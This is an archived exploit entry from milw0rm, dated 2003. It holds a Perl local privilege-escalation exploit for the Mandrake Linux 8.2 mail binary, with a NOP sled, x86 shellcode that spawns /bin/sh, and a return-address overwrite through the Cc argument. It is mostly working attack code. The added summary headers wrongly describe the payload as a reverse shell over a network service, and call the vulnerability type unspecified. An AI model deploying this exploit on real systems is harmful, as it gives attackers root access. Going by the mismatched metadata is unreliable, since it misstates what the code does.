# #<-- Publish Date -->#
# 2003-06-10

# #<-- Technical Document Summary (TDS) -->#
# The script constructs a buffer by concatenating a fixed NOP sled, a shellcode payload, and additional data. It sets an environment variable containing the crafted buffer, then executes the mail command with the buffer as an argument to launch a reverse-shell. The vulnerability lies in unsanitized input being written into a fixed-size memory region, allowing arbitrary code execution via crafted payload. Affected component: Mandrake Linux 8.2 mail binary; exploit type: local code injection.

# #<-- Layman's Document Summary (LDS) -->#
# The weakness is a lack of input validation that lets an attacker control the size and content of a buffer used in a system call. This allows an attacker to execute arbitrary commands on the affected system by injecting malicious shellcode into memory. The vulnerable component is the mail program's handling of user‑supplied data.

# #<-- Key Words (KW) -->#
# Mandrake Linux, local exploit, buffer overflow, shellcode injection, reverse shell, OSVDB-60550

# #<-- Related Terms -->#
# exploit, buffer overflow, local code execution, reverse engineering, Mandrake Linux, mail binary, shellcode, offset calculation, environment variable injection

# #<-- Entities/Attributes -->#
# Software: Mandrake Linux 8.2, mail program; Version: 8.2; Platform: Linux; Function: exec, sprintf, strlen; NOP sled; Architecture: x86; Protocols: local network service

# #<-- Vulnerability Type -->#
# Not specified in source

# #<-- Original Content -->#

#!/usr/bin/perl
###############################
# Mandrake 8.2 /usr/mail local exploit
#
# Usage:
# perl d86mail.pl [offset]
# Then enter "." (dot) and press 'Enter'
#
# Example:
# [satan@localhost my]$ perl d86mail.pl
# eip: 0xbffffddd
# .[enter]
# Cc: too long to edit
# sh-2.05$
###############################

$shellcode =
   "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" .
   "\x31\xdb\x89\xd8\xb0\x2e\xcd\x80" .
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
$size = 1000;
$size2 = 8204;
$retaddr = 0xbffffddd;
$nop = "\x90";
$offset = 0;
if (@ARGV == 1) {
  $offset = $ARGV[0];
}
for ($i = 0; $i < ($size - length($shellcode) - 4); $i++) {
   $buffer .= $nop;
}
for ($i = 0; $i < ($size2); $i++) {
   $buffer2 .= "A";
}
$buffer .= $shellcode;
print "eip: 0x", sprintf('%lx',($retaddr + $offset)), "\n";
local($ENV{'EVILBUF'}) = $buffer;
$newret = pack('l', ($retaddr + $offset));
$buffer2 .= $newret;
exec("mail -s wow -c $buffer2 root@localhost");

#EOF


# milw0rm.com [2003-06-10]